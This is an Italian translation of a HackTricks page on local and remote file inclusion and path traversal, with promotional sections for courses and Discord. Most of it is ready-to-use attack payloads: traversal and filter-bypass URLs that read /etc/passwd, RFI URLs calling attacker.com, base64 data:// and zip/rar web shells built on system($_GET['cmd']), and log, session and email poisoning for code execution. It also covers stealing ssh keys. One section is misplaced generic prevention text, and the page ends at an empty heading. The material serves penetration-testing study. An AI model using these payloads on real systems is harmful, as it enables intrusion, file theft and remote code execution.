# Inclusione di file/Traversamento di percorso

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Unisciti al server [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) per comunicare con hacker esperti e cacciatori di bug bounty!

**Insight sull'hacking**\
Interagisci con contenuti che approfondiscono l'emozione e le sfide dell'hacking

**Notizie sull'hacking in tempo reale**\
Resta aggiornato sul mondo dell'hacking frenetico attraverso notizie e approfondimenti in tempo reale

**Ultime notizie**\
Rimani informato sul lancio delle nuove bug bounty e sugli aggiornamenti cruciali della piattaforma

**Unisciti a noi su** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e inizia a collaborare con i migliori hacker oggi stesso!

## Inclusione di file

**Inclusione di file remoto (RFI):** Il file viene caricato da un server remoto (Migliore: puoi scrivere il codice e il server lo eseguir√†). In php questo √® **disabilitato** per impostazione predefinita (**allow\_url\_include**).\
**Inclusione di file locale (LFI):** Il server carica un file locale.

La vulnerabilit√† si verifica quando l'utente pu√≤ controllare in qualche modo il file che verr√† caricato dal server.

Funzioni PHP vulnerabili: require, require\_once, include, include\_once

Uno strumento interessante per sfruttare questa vulnerabilit√†: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interessante - File LFI2RCE
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Mischiando diverse liste LFI \*nix e aggiungendo ulteriori percorsi, ho creato questa:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Prova anche a cambiare `/` con `\`\
Prova anche ad aggiungere `../../../../../`

Puoi trovare una lista che utilizza diverse tecniche per trovare il file /etc/password (per verificare se esiste la vulnerabilit√†) [qui](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Unione di diverse liste di parole:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Prova anche a cambiare `/` con `\`\
Prova anche a rimuovere `C:/` e aggiungere `../../../../../`

Puoi trovare una lista che utilizza diverse tecniche per trovare il file /boot.ini (per verificare se esiste la vulnerabilit√†) [qui](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Controlla la lista LFI di Linux.

## LFI di base e bypass

Tutti gli esempi sono per Local File Inclusion, ma possono essere applicati anche a Remote File Inclusion (pagina=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### sequenze di attraversamento rimosse in modo non ricorsivo

When performing file inclusion attacks, it is common to encounter input validation mechanisms that strip traversal sequences (such as "../" or "..\") recursively. However, in some cases, these sequences are only stripped once, allowing for non-recursive traversal attacks.

Durante l'esecuzione di attacchi di inclusione di file, √® comune incontrare meccanismi di convalida dell'input che rimuovono sequenze di attraversamento (come "../" o "..\") in modo ricorsivo. Tuttavia, in alcuni casi, queste sequenze vengono rimosse solo una volta, consentendo attacchi di attraversamento non ricorsivi.
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypassa l'aggiunta di ulteriori caratteri alla fine della stringa fornita (bypass di: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Questo √® **risolto dalla versione PHP 5.4**

### **Codifica**

Potresti utilizzare codifiche non standard come la doppia codifica URL (e altre):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Da cartella esistente

Forse il back-end sta controllando il percorso della cartella:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Esplorazione delle directory del file system su un server

Il file system di un server pu√≤ essere esplorato in modo ricorsivo per identificare le directory, non solo i file, utilizzando determinate tecniche. Questo processo prevede di determinare la profondit√† della directory e sondare l'esistenza di specifiche cartelle. Di seguito √® riportato un metodo dettagliato per raggiungere questo obiettivo:

1. **Determinare la profondit√† della directory:**
Verificare la profondit√† della directory corrente recuperando con successo il file `/etc/passwd` (applicabile se il server √® basato su Linux). Un esempio di URL potrebbe essere strutturato come segue, indicando una profondit√† di tre:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Sondaggio per le Cartelle:**
Aggiungi il nome della cartella sospetta (ad esempio, `private`) all'URL, quindi torna alla directory `/etc/passwd`. Il livello aggiuntivo della directory richiede di incrementare la profondit√† di uno:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpretare i risultati:**
La risposta del server indica se la cartella esiste:
- **Errore / Nessun output:** La cartella `private` probabilmente non esiste nella posizione specificata.
- **Contenuto di `/etc/passwd`:** La presenza della cartella `private` √® confermata.

4. **Esplorazione ricorsiva:**
Le cartelle scoperte possono essere ulteriormente esplorate per cercare sottocartelle o file utilizzando la stessa tecnica o metodi tradizionali di Local File Inclusion (LFI).

Per esplorare directory in posizioni diverse nel sistema di file, adatta il payload di conseguenza. Ad esempio, per verificare se `/var/www/` contiene una cartella `private` (ipotizzando che la directory corrente sia a una profondit√† di 3), utilizza:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Tecnica di Troncamento del Percorso**

La troncatura del percorso √® un metodo utilizzato per manipolare i percorsi dei file nelle applicazioni web. Spesso viene utilizzato per accedere a file restritti eludendo determinate misure di sicurezza che aggiungono caratteri aggiuntivi alla fine dei percorsi dei file. L'obiettivo √® creare un percorso del file che, una volta modificato dalla misura di sicurezza, punti ancora al file desiderato.

In PHP, diverse rappresentazioni di un percorso di file possono essere considerate equivalenti a causa della natura del sistema di file. Ad esempio:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` e `/etc/passwd/` sono tutti considerati lo stesso percorso.
- Quando gli ultimi 6 caratteri sono `passwd`, aggiungere una `/` (rendendolo `passwd/`) non cambia il file di destinazione.
- Allo stesso modo, se viene aggiunto `.php` a un percorso di file (come `shellcode.php`), l'aggiunta di `/.` alla fine non modificher√† il file a cui si accede.

Gli esempi forniti mostrano come utilizzare la troncatura del percorso per accedere a `/etc/passwd`, un obiettivo comune a causa del suo contenuto sensibile (informazioni sull'account utente):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
In questi scenari, il numero di attraversamenti necessari potrebbe essere circa 2027, ma questo numero pu√≤ variare in base alla configurazione del server.

- **Utilizzo di segmenti puntati e caratteri aggiuntivi**:
Le sequenze di attraversamento (`../`) combinate con segmenti puntati aggiuntivi e caratteri possono essere utilizzate per navigare nel file system, ignorando efficacemente le stringhe aggiunte dal server.

- **Determinazione del numero di attraversamenti necessari**:
Attraverso tentativi ed errori, √® possibile trovare il numero preciso di sequenze `../` necessarie per navigare nella directory radice e quindi in `/etc/passwd`, assicurandosi che le stringhe aggiunte (come `.php`) siano neutralizzate ma il percorso desiderato (`/etc/passwd`) rimanga intatto.

- **Iniziare con una directory fittizia**:
√à pratica comune iniziare il percorso con una directory inesistente (come `a/`). Questa tecnica viene utilizzata come misura precauzionale o per soddisfare i requisiti della logica di analisi del percorso del server.

Quando si utilizzano tecniche di troncamento del percorso, √® fondamentale comprendere il comportamento di analisi del percorso del server e la struttura del file system. Ogni scenario potrebbe richiedere un approccio diverso e spesso √® necessario effettuare test per trovare il metodo pi√π efficace.

**Questa vulnerabilit√† √® stata corretta in PHP 5.3.**

### **Trucchi per eludere i filtri**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Inclusione Remota di File

In PHP, questa funzionalit√† √® disabilitata di default perch√© **`allow_url_include`** √® impostato su **Off**. Deve essere impostato su **On** affinch√© funzioni, e in tal caso √® possibile includere un file PHP dal proprio server e ottenere RCE (Remote Code Execution):
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Se per qualche motivo **`allow_url_include`** √® impostato su **On**, ma PHP sta **filtrando** l'accesso alle pagine web esterne, [secondo questo post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), potresti utilizzare ad esempio il protocollo data con base64 per decodificare un codice PHP in base64 ed ottenere RCE:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
Nel codice precedente, √® stato aggiunto il `+.txt` finale perch√© l'attaccante aveva bisogno di una stringa che terminasse con `.txt`, quindi la stringa termina con essa e dopo la decodifica b64 quella parte restituir√† solo dati inutili e il vero codice PHP verr√† incluso (e quindi eseguito).
{% endhint %}

Un altro esempio **senza utilizzare il protocollo `php://`** sarebbe:

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Elemento radice di Python

In Python, in un codice come questo:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Se l'utente passa un **percorso assoluto** a **`file_name`**, il **percorso precedente viene semplicemente rimosso**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
√à il comportamento previsto secondo [la documentazione](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Se un componente √® un percorso assoluto, tutti i componenti precedenti vengono eliminati e la concatenazione continua dal componente del percorso assoluto.

## Elenco delle directory in Java

Sembra che se hai una Traversa del Percorso in Java e **richiedi una directory** invece di un file, viene restituito un **elenco della directory**. Questo non accade in altri linguaggi (che io sappia).

## Top 25 parametri

Ecco una lista dei primi 25 parametri che potrebbero essere vulnerabili a vulnerabilit√† di inclusione di file locali (LFI) (da [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI utilizzando wrapper e protocolli PHP

### php://filter

I filtri PHP consentono di eseguire **operazioni di modifica di base sui dati** prima che vengano letti o scritti. Ci sono 5 categorie di filtri:

* [Filtri di stringa](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Rimuove i tag dai dati (tutto ci√≤ che si trova tra i caratteri "<" e ">")
* Nota che questo filtro √® scomparso dalle versioni moderne di PHP
* [Filtri di conversione](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : Trasforma in una codifica diversa (`convert.iconv.<input_enc>.<output_enc>`). Per ottenere l'**elenco di tutte le codifiche** supportate, eseguire nella console: `iconv -l`

{% hint style="warning" %}
Sfruttando il filtro di conversione `convert.iconv.*` √® possibile **generare testo arbitrario**, il che potrebbe essere utile per scrivere testo arbitrario o per eseguire una funzione come include con testo arbitrario. Per ulteriori informazioni, consulta [**LFI2RCE tramite filtri php**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Filtri di compressione](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: Comprime il contenuto (utile se si sta esfiltrando molte informazioni)
* `zlib.inflate`: Decomprime i dati
* [Filtri di crittografia](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : Deprecato
* `mdecrypt.*` : Deprecato
* Altri filtri
* Eseguendo in php `var_dump(stream_get_filters());` √® possibile trovare un paio di **filtri inaspettati**:
* `consumed`
* `dechunk`: inverte la codifica chunked HTTP
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,¬£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
La parte "php://filter" non fa distinzione tra maiuscole e minuscole.
{% endhint %}

### php://fd

Questo wrapper consente di accedere ai descrittori di file che il processo ha aperto. Potenzialmente utile per esfiltrare il contenuto dei file aperti:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Puoi anche utilizzare **php://stdin, php://stdout e php://stderr** per accedere rispettivamente ai **descrittori di file 0, 1 e 2** (non sono sicuro di come possa essere utile in un attacco)

### zip:// e rar://

Carica un file Zip o Rar con una PHPShell al suo interno e accedici.\
Per poter abusare del protocollo rar, **√® necessario attivarlo specificamente**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

La tecnica di inclusione di file consente a un attaccante di caricare e visualizzare file arbitrari sul server di destinazione. Questo pu√≤ essere sfruttato per ottenere informazioni sensibili, eseguire codice malevolo o compromettere il sistema.

#### Tipi di inclusione di file

Ci sono due tipi principali di inclusione di file:

1. Inclusione di file locale: l'attaccante sfrutta una vulnerabilit√† nel codice per includere un file presente sul server stesso.
2. Inclusione di file remoto: l'attaccante sfrutta una vulnerabilit√† nel codice per includere un file esterno, ad esempio da un server remoto.

#### Vulnerabilit√† comuni

Le vulnerabilit√† comuni che possono essere sfruttate per l'inclusione di file includono:

- Inclusione di file diretta: l'attaccante pu√≤ specificare direttamente il percorso del file da includere.
- Inclusione di file basata su parametri: l'attaccante pu√≤ manipolare i parametri dell'URL o di un modulo per includere un file specifico.
- Inclusione di file basata su cookie: l'attaccante pu√≤ manipolare i cookie per includere un file specifico.
- Inclusione di file basata su sessione: l'attaccante pu√≤ manipolare la sessione per includere un file specifico.

#### Prevenzione

Per prevenire l'inclusione di file, √® consigliabile adottare le seguenti misure:

- Validazione dei dati di input: verificare che i dati di input siano validi e non contengano caratteri speciali o sequenze pericolose.
- Utilizzo di percorsi relativi: utilizzare percorsi relativi invece di percorsi assoluti per includere file.
- Limitazione dei privilegi: limitare i privilegi dell'account utilizzato dal server per eseguire il codice.
- Monitoraggio delle attivit√† sospette: monitorare costantemente il server per rilevare eventuali attivit√† sospette o tentativi di inclusione di file.

#### Esempi di inclusione di file

Ecco alcuni esempi di come l'inclusione di file pu√≤ essere sfruttata:

- Inclusione di file locale: `http://example.com/index.php?page=/etc/passwd`
- Inclusione di file remoto: `http://example.com/index.php?page=http://attacker.com/malicious.php`

#### Conclusioni

L'inclusione di file √® una vulnerabilit√† comune che pu√≤ essere sfruttata dagli attaccanti per ottenere accesso non autorizzato a file sensibili o eseguire codice malevolo. √à importante prendere le misure necessarie per prevenire questa vulnerabilit√† e proteggere il sistema da potenziali attacchi.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Nota che questo protocollo √® limitato dalle configurazioni php **`allow_url_open`** e **`allow_url_include`**

### expect://

Expect deve essere attivato. Puoi eseguire il codice utilizzando questo:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Specifica il tuo payload nei parametri POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Un file `.phar` pu√≤ essere utilizzato per eseguire codice PHP quando un'applicazione web utilizza funzioni come `include` per il caricamento dei file. Il frammento di codice PHP fornito di seguito mostra la creazione di un file `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Per compilare il file `.phar`, eseguire il seguente comando:
```bash
php --define phar.readonly=0 create_path.php
```
All'esecuzione, verr√† creato un file chiamato `test.phar`, che potrebbe essere sfruttato per sfruttare vulnerabilit√† di inclusione di file locali (LFI).

Nei casi in cui LFI esegue solo la lettura del file senza eseguire il codice PHP al suo interno, attraverso funzioni come `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, o `filesize()`, potrebbe essere tentata l'exploit di una vulnerabilit√† di deserializzazione. Questa vulnerabilit√† √® associata alla lettura di file utilizzando il protocollo `phar`.

Per una comprensione dettagliata dell'exploit delle vulnerabilit√† di deserializzazione nel contesto dei file `.phar`, fare riferimento al documento collegato di seguito:

[Guida all'exploit della deserializzazione di Phar](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### Altri protocolli

Controlla altri possibili [**protocolli da includere qui**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory e php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) ‚Äî Scrivi in memoria o in un file temporaneo (non sono sicuro di come possa essere utile in un attacco di inclusione di file)
* [file://](https://www.php.net/manual/en/wrappers.file.php) ‚Äî Accesso al file system locale
* [http://](https://www.php.net/manual/en/wrappers.http.php) ‚Äî Accesso a URL HTTP(s)
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) ‚Äî Accesso a URL FTP(s)
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) ‚Äî Compressione dei flussi
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) ‚Äî Trova percorsi corrispondenti al pattern (non restituisce nulla di stampabile, quindi non √® davvero utile qui)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) ‚Äî Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) ‚Äî Flussi audio (non utile per leggere file arbitrari)

## LFI tramite 'assert' di PHP

I rischi di inclusione di file locali (LFI) in PHP sono particolarmente alti quando si utilizza la funzione 'assert', che pu√≤ eseguire il codice all'interno delle stringhe. Questo √® particolarmente problematico se l'input contenente caratteri di attraversamento delle directory come ".." viene controllato ma non viene correttamente sanificato.

Ad esempio, il codice PHP potrebbe essere progettato per impedire l'attraversamento delle directory in questo modo:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Mentre questo mira a fermare la traversa, crea involontariamente un vettore per l'iniezione di codice. Per sfruttare ci√≤ per leggere il contenuto dei file, un attaccante potrebbe utilizzare:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Allo stesso modo, per eseguire comandi di sistema arbitrari, si potrebbe utilizzare:
```plaintext
' and die(system("id")) or '
```
√à importante **URL-codificare questi payload**.


<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Unisciti al server [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) per comunicare con hacker esperti e cacciatori di bug bounty!

**Hacking Insights**\
Interagisci con contenuti che approfondiscono l'emozione e le sfide dell'hacking

**Notizie di Hacking in Tempo Reale**\
Resta aggiornato con il mondo dell'hacking frenetico attraverso notizie e approfondimenti in tempo reale

**Ultime Novit√†**\
Rimani informato con i nuovi bug bounty in arrivo e gli aggiornamenti cruciali della piattaforma

**Unisciti a noi su** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e inizia a collaborare con i migliori hacker oggi stesso!

## PHP Blind Path Traversal

{% hint style="warning" %}
Questa tecnica √® rilevante nei casi in cui **controlli** il **percorso del file** di una **funzione PHP** che acceder√† a un file ma non vedrai il contenuto del file (come una semplice chiamata a **`file()`**) ma il contenuto non viene mostrato.
{% endhint %}

In [**questo incredibile post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) viene spiegato come una blind path traversal pu√≤ essere abusata tramite il filtro PHP per **esfiltrare il contenuto di un file tramite un oracolo di errore**.

In sintesi, la tecnica utilizza la codifica **"UCS-4LE"** per rendere il contenuto di un file cos√¨ **grande** che la **funzione PHP che apre** il file generer√† un **errore**.

Successivamente, per rivelare il primo carattere, viene utilizzato il filtro **`dechunk`** insieme ad altri come **base64** o **rot13** e infine vengono utilizzati i filtri **convert.iconv.UCS-4.UCS-4LE** e **convert.iconv.UTF16.UTF-16BE** per **posizionare altri caratteri all'inizio e rivelarli**.

**Funzioni che potrebbero essere vulnerabili**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (solo destinazione in sola lettura con questo)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Per i dettagli tecnici, consulta il post menzionato!

## LFI2RCE

### Inclusione Remota di File

Spiegato in precedenza, [**seguire questo link**](./#remote-file-inclusion).

### Tramite file di log di Apache/Nginx

Se il server Apache o Nginx √® **vulnerabile a LFI** all'interno della funzione di inclusione, √® possibile provare ad accedere a **`/var/log/apache2/access.log` o `/var/log/nginx/access.log`**, impostare all'interno dell'**user agent** o all'interno di un **parametro GET** una shell php come **`<?php system($_GET['c']); ?>`** e includere quel file

{% hint style="warning" %}
Nota che **se usi virgolette doppie** per la shell invece di **virgolette semplici**, le virgolette doppie verranno modificate dalla stringa "_**quote;**_", **PHP generer√† un errore** e **null'altro verr√† eseguito**.

Inoltre, assicurati di **scrivere correttamente il payload** o PHP generer√† un errore ogni volta che prova a caricare il file di log e non avrai una seconda opportunit√†.
{% endhint %}

Questo potrebbe essere fatto anche in altri log ma **fai attenzione**, il codice all'interno dei log potrebbe essere codificato in URL e questo potrebbe distruggere la Shell. L'intestazione **authorisation "basic"** contiene "user:password" in Base64 e viene decodificata all'interno dei log. La PHPShell potrebbe essere inserita all'interno di questa intestazione.\
Altri possibili percorsi dei log:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Elenco di parole per il fuzzing: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Tramite Email

**Invia una mail** a un account interno (user@localhost) contenente il tuo payload PHP come `<?php echo system($_REQUEST["cmd"]); ?>` e prova ad includerlo nella mail dell'utente con un percorso come **`/var/mail/<USERNAME>`** o **`/var/spool/mail/<USERNAME>`**

### Tramite /proc/\*/fd/\*

1. Carica molti shell (ad esempio: 100)
2. Includi [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), con $PID = PID del processo (pu√≤ essere forzato) e $FD il descrittore del file (pu√≤ essere forzato anche questo)

### Tramite /proc/self/environ

Come un file di log, invia il payload nell'User-Agent, verr√† riflessa nel file /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Tramite caricamento

Se puoi caricare un file, basta iniettare il payload dello shell al suo interno (ad esempio: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Per mantenere il file leggibile, √® meglio iniettare i metadati delle immagini/doc/pdf.

### Tramite caricamento di file ZIP

Carica un file ZIP contenente una shell PHP compressa e accedi:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Attraverso le sessioni PHP

Verifica se il sito web utilizza le sessioni PHP (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP queste sessioni vengono memorizzate nei file _/var/lib/php5/sess\\_\[PHPSESSID]\_
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Imposta il cookie su `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Utilizza LFI per includere il file di sessione PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Tramite ssh

Se ssh √® attivo, controlla quale utente viene utilizzato (/proc/self/status e /etc/passwd) e prova ad accedere a **\<HOME>/.ssh/id\_rsa**

### Tramite i log di **vsftpd**

I log del server FTP vsftpd si trovano in **_/var/log/vsftpd.log_**. Nel caso in cui esista una vulnerabilit√† di Local File Inclusion (LFI) e sia possibile accedere a un server vsftpd esposto, si possono considerare i seguenti passaggi:

1. Inietta un payload PHP nel campo dell'username durante il processo di accesso.
2. Dopo l'iniezione, utilizza LFI per recuperare i log del server da **_/var/log/vsftpd.log_**.


### Tramite filtro php base64 (utilizzando base64)

Come mostrato in [questo](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) articolo, il filtro base64 di PHP ignora semplicemente i caratteri non base64. Puoi utilizzarlo per eludere il controllo dell'estensione del file: se fornisci un base64 che termina con ".php", esso ignorer√† il "." e aggiunger√† "php" al base64. Ecco un esempio di payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Attraverso i filtri php (nessun file necessario)

Questo [**articolo**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) spiega che √® possibile utilizzare **filtri php per generare contenuti arbitrari** come output. Ci√≤ significa essenzialmente che √® possibile **generare codice php arbitrario** per l'inclusione **senza la necessit√† di scriverlo** in un file.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Attraverso segmentation fault

